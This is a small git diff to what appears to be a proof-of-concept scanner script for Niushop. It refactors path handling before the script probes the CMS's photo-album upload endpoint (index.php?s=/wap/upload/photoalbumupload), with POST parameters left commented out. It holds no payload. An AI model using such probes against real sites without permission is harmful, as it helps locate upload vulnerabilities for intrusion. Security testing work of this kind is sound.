@@ -23,14 +23,8 @@ class POC(Script):
     async def prove(self):
         await self.get_url()
         if self.base_url:
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.base_url, '../niushop/'),
-                self.url_normpath(self.url, 'niushop/'),
-                self.url_normpath(self.url, '../niushop/'),
-            ]))
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, ['./niushop/', './']):
                     url = path + 'index.php'
                     paramsGet = {"s": "/wap/upload/photoalbumupload"}
                     # paramsPost = {"file_path": "upload/goods/", "album_id": "30", "type": "1,2,3,4"}
